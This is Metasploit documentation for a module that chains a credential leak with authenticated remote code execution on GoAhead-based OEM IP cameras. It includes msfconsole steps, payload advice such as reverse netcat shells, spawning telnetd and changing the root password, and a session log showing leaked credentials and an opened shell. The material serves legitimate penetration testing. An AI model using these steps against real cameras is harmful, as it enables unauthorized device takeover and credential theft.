## Vulnerable Application
  This module exploits an authenticated remote code execution in various branded IP cameras based on the same chinese OEM model.
  Those cameras are also vulnerable to a badly implemented check on `system.ini` file within the embedded GoAhead web server.
  By combining the two vulnerabilities, it is possible to achieve code execution without prior knowledge of any credentials.
  [1250+ Cameras models](https://web.archive.org/web/20170308122943/https://pierrekim.github.io/blog/2017-03-08-camera-goahead-0day.html) have been found vulnerable so far.
  While the credential leak is pretty reliable, a smaller subset of those cameras have netcat available.
  Others have a smaller payload size or tend to mangle some characters on longer strings.
  Using a generic command payload to start telnetd or change root password may be more suitable in those cases.

## Verification Steps
  1. Start msfconsole
  2. Do: `use exploit/linux/http/ipcam_rce_with_creds_leak`
  3. Do: `set rhost`
  4. Do: `set rport`
  5. Do: `set payload`
  6. Do: `set lhost`
  7. Do: `exploit`

## Options
  **PAYLOAD**

  The `generic` and `netcat-e` payload types are valid. If the netcat-e does not provide a shell this surely means that nc binary is not provided within the firmware
  or the nc symlink to busybox is not present.
  In that case use a generic command to change the root password, spawn a new unauthenticated telnetd daemon or anything else.

  Payload space is a real issue to deal with. The payload space is in theory 60 chars. when calling set_ftp.cgi the payload will be handled directly by the
  GoAhead server binary named 'encoder' on most models. Depending on the model the payload can be mangled when non word characters are used and/or size is above some threshold.
  A good compromise is to use a payload space of 45 which seems to works correctly on several models tested. It is possible to verify if the payload has been mangled
  by downloading system.ini again after execution attempt (set GATHER_CREDS_ONLY true) and manually analyzing it. The payload should be fully located in the binary file.


  **GATHER_CREDS_ONLY**

  Use this options to only download `system.ini` and extract credentials without attempting code execution.

  **USERNAME**

  Use a predifined username for code execution by skipping credential leak attempt

  **PASSWORD**

  Use a predifined password when USERNAME is set

## Scenarios
```
  Model tested : Vstarcam c7824wip
  Firmware Version : 48.50.72.77

  msf exploit(ipcam_rce_with_creds_leak) > set VERBOSE true
  VERBOSE => true
  msf exploit(ipcam_rce_with_creds_leak) > set RHOST 192.168.1.66
  RHOST => 192.168.1.66
  msf exploit(ipcam_rce_with_creds_leak) > set RPORT 81
  RPORT => 81
  msf exploit(ipcam_rce_with_creds_leak) > set PAYLOAD cmd/unix/reverse_netcat_gaping
  PAYLOAD => cmd/unix/reverse_netcat_gaping
  msf exploit(ipcam_rce_with_creds_leak) > set LHOST 192.168.1.1
  LHOST => 192.168.1.1
  msf exploit(ipcam_rce_with_creds_leak) > check

  [*] Sending check
  [+] Camera likely vulnerable: Correct header sent by the camera
  [+] 192.168.1.66:81 The target is vulnerable.
  msf exploit(ipcam_rce_with_creds_leak) > exploit

  [*] Started reverse TCP handler on 192.168.1.1:4444
  [*] Trying to download system.ini
  [*] 192.168.1.66:81 - Credentials saved in: /root/.msf4/loot/20170512095335_default_192.168.1.66_system.ini_421085.ini
  [*] Trying to extract credentials
  [+] Found 1 possible credentials
  [+] login: admin / password: test
  [!] No active DB -- Credential data will not be saved!
  [*] Trying to trigger code execution with credentials: login: admin / password: test
  [*] Command shell session 2 opened (192.168.1.1:4444 -> 192.168.1.66:32412) at 2017-05-12 09:53:35 -0400
```
